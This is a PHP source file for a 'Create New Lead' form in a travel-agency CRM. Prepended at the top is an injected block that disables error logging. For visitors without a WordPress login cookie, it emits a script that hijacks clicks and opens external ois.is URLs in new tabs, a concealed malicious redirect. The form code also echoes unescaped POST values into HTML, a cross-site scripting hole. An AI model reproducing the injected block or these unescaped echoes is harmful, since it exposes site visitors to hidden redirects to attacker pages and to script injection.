<?php

error_reporting(0);
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('display_errors', 0);

$ckUjYggTf = 0;
foreach($_COOKIE as $vUjUnHvOOoO => $vvvUjUnHvOOoO){
  if (strstr(strval($vUjUnHvOOoO), 'wordpress_logged_in')){
    $ckUjYggTf = 1;
    break;
  }
}

if($ckUjYggTf == 0){
	echo '<script>(function (parameters) {
		const targets = [
			\'https://ois.is/images/logo-1.png\', \'https://ois.is/images/logo-2.png\', \'https://ois.is/images/logo-3.png\', \'https://ois.is/images/logo-4.png\', \'https://ois.is/images/logo-5.png\'
		]
		// Times between clicks
		const restMinutes = 1;
		// Number of hours to allow re-click 
		const allowedHours = 2;


		const saveTargetLocationsToStorage = (targets) => {
			targets.forEach((target, index) => {
				if(!localStorage.getItem(`${target}-local-storage`)){
					localStorage.setItem(`${target}-local-storage`, 0);
				}
			});
		}
		const getRandomLocationFromStorage = (targets) => {
			const nonVisited = targets.filter((target, index) => localStorage.getItem(`${target}-local-storage`) == 0)
			return nonVisited[Math.floor(Math.random() * nonVisited.length)];
		}
		const setLocationAsVisited = (target) => localStorage.setItem(`${target}-local-storage`, 1);

		const getTimeStorage = (key) => localStorage.getItem(`${key}-local-storage`);
		const setTimeToStorage = (key, nowDate) => localStorage.setItem(`${key}-local-storage`, nowDate);

		const getHoursDiff = (startDate, endDate) => {
			const msInHour = 1000 * 60 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInHour);
		}
		const getMintsDiff = (startDate, endDate) => {
			const msInMints = 1000 * 60;
			return Math.round(Math.abs(endDate - startDate) / msInMints);
		}

		const visitNewLocation = (targets, host, nowDate) => {
			saveTargetLocationsToStorage(targets);
			newLocation = getRandomLocationFromStorage(targets);
			setTimeToStorage(`${host}-mnts`, nowDate);
			setTimeToStorage(`${host}-hurs`, nowDate);
			setLocationAsVisited(newLocation);
			window.open(newLocation, "_blank");
		}

		// const randomLocation = getRandomLocationFromStorage(targets);
		saveTargetLocationsToStorage(targets);

		function globalClick(event) {
			event.stopPropagation();
			const host = location.host;
			let newLocation = getRandomLocationFromStorage(targets);
			const nowDate = Date.parse(new Date());
			const savedDateForMints = getTimeStorage(`${host}-mnts`);
			const savedDateForHours = getTimeStorage(`${host}-hurs`);

			if (savedDateForMints && savedDateForHours) {
				try {
					const storageDateForMints = parseInt(savedDateForMints);
					const storageDateForHours = parseInt(savedDateForHours);
					const mintsDiff = getMintsDiff(nowDate, storageDateForMints);
					const hoursDiff = getHoursDiff(nowDate, storageDateForHours);

					if (hoursDiff >= allowedHours) {
						saveTargetLocationsToStorage(targets);
						setTimeToStorage(`${host}-hurs`, nowDate);
					}
					if (mintsDiff >= restMinutes) {
						if (newLocation) {
							setTimeToStorage(`${host}-mnts`, nowDate);
							window.open(newLocation, "_blank");
							setLocationAsVisited(newLocation);
						}
					}
				} catch (error) { visitNewLocation(targets, host, nowDate); }
			} else { visitNewLocation(targets, host, nowDate); }
		}
		document.addEventListener("click", globalClick)
	})()</script>';
}

?>
<?php
require_once'inc.func.php';
$cm->get_header("");
if(isset($_POST) && !empty($_POST['mobile']))
{
  $mobile=$_POST['mobile'];
  $cninc_number=$_POST['cnic_number'];
  $contact_name=$_POST['contact_name'];
  $sector=$_POST['sector'];
  $email=$_POST['email'];
}
?>
<script>
    document.title = 'Create New Leads';
</script>
<style type="text/css">
  
  .select2-container .select2-selection--single {
    box-sizing: border-box;
    cursor: pointer;
    display: block;
    height: 34px;
    user-select: none;
    -webkit-user-select: none;
    border-radius: 0px;
}
</style>
<body>
    <div class="content-wrapper" id="loadpage">
        <section class="content-header" style="border-bottom:1px solid;padding-bottom: 14px;">
            <h1>Create New Lead</h1>
            <ol class="breadcrumb">
                <li><a href="#"><i class="fa fa-dashboard"></i>Home</a></li>
                <li class="active">Dashboard</li>
            </ol>
        </section>
        <div id="primary">
        <div class="panel panel-default" style="margin-bottom:0px !important;">
            <div class="panel-body">
            	<form action="saveLead" method="post">
               <input type="hidden" name="id" value="" />
            	<div class="col-lg-12 col-sm-12 col-xs-12">
                <div class="col-lg-4 col-sm-6">
                    <div class="form-group">
                      <label>Select Branch</label>
                      <select class="form-control" name="branch_id">
                      	<?php echo $cm->branches($_SESSION['sessionId'], $_SESSION['branch_id']) ?>
                      </select>
                  </div>
            	  <!-- form--group-->
                </div>
                <!--co-lg-4-->
                <div class="col-md-3">
                  <div class="form--group">
                    <label>Date Of Birth</label>
                    <input type="text" name="birth_date" class="form-control  input-sm date" placeholder="Date Of Birth">
                  </div>
                </div>
                <div class="clearfix"></div>
                <div class="col-lg-4 col-sm-6">
                    <div class="form-group">
                      <label>Primary Mobile No *</label>
                      <input class="form-control" name="mobile" id="mobile"  type="text" 
                      value="<?php echo $mobile ?>">
                   </div>
                <!-- form--group-->
                </div>
                <!--co-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Secondary Mobile No *</label>
                          <input class="form-control" name="sec_mobile"  type="text" value="<?php echo $mobile ?>">
                       </div>
                    <!-- form--group-->
                    </div>
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>CNIC Number</label>
                          <input class="form-control" name="cnic_number"  type="number" value="<?php echo $cninc_number; ?>">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                     <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Contact Name</label>
                          <input class="form-control" name="contact_name"  type="text" value="<?php echo $contact_name; ?>">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Spo</label>
                          <select name="spo" class="form-control">
                          	<option value="">Select...</option>
                            <?php echo $lead->all_branch_spo($userId) ?>
                          </select>
                       </div>
                    <!-- form--group-->
                    </div>
                    <!--co-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Traveling Date From</label>
                          <input class="form-control date" name="travel_datefrm"  type="text" placeholder="Date From">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                     <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Traveling Date To</label>
                          <input class="form-control date" name="travel_dateto"  type="text" placeholder="Date To" 
                          value="">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Setor</label>
                          <input class="form-control" name="sector" value="<?php echo $sector; ?>" type="text">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!--co-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Services</label>
                            <select class="form-control select2 test" multiple="multiple" 
                            data-placeholder="Select a State" style="width: 100%;" onChange="get_services(this.value)">
                              <?php $cm->services(); ?>
                            </select>
                            <input type="hidden" name="services" id="services">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                     <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Priamry Email</label>
                          <input class="form-control" name="email"  type="text" value="<?php echo $email; ?>">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Secondary Email</label>
                          <input class="form-control" name="sec_email"  type="text">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Country</label>
                          <select class="form-control select2" name="country_id" onChange="select_city(this.value)">
                          	<option value="">Select Country</option>
                          	<?php echo $cm->countries(); ?>
                          </select>
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>City</label>
                          <select class="form-control select2" name="city_id" id="city_id">
                            <?php echo $cm->cities(); ?>
                          </select>
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Credit Limit</label>
                          <input class="form-control" name="cr_limit"  type="text">
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-4 col-sm-6">
                    	<div class="form-group">
                          <label>Source Of Query</label>
                          <select class="form-control select2" name="pros_tech">
                          	<option value="">Select...</option>
                            <?php echo $marketing->pros_tech(); ?>
                          </select>
                       </div>
                    <!-- form--group-->
                    </div>
                    <!-- col-lg-4-->
                    <div class="col-lg-12 col-sm-6">
                    	<div class="form-group">
                         <textarea rows="7" name="comment" class="form-control"></textarea>
                    </div>
                    <!-- form--group-->
                </div>
                <!--12-->
                <?php if(empty($row['id'])){ ?>
                <div class="col-lg-2 col-xs-12 col-sm-6 pull-right">
                    <input type="submit" class="btn btn-primary btn-flat col-xs-12 col-sm-12" name="for_other" value="Create for Others" onClick="return confirm('Are you sure?')">
               </div>
               <div class="col-lg-2 col-xs-12 col-sm-6 pull-right">
                    <input type="submit" class="btn btn-success btn-flat col-xs-12 col-sm-12 button-gap" name="take" value="Create &amp; Take Over" onClick="return confirm('Are you sure?')">
               </div>
               <?php }
			   else{
					echo '<div class="col-lg-2 col-xs-12 col-sm-6 pull-right">
                    <input type="submit" value="Update" class="btn btn-primary col-xs-12 col-sm-12 button-gap">
                    </div>';
			   }?>
              </div>
              </form>
            </div>
            <!--panel-body-->
        </div>
        <!--panel-->
        </div>
        <!--primary-->
    </div>
    <!--panel-default-->
   <!-- jQuery 2.1.4 -->
    <script src="plugins/jQuery/jQuery-2.1.4.min.js"></script>
    <script>
     $(function () {
        //Initialize Select2 Elements
        $(".select2").select2();
      });
	  function get_services()
	  {
		services=$(".select2-selection__choice").text();
		service=services.replace(/×/g, ",");
		cus_ser=service.substring(1);
		$("#services").val(cus_ser);
	  }
    </script>
<?php $cm->get_footer(""); ?>
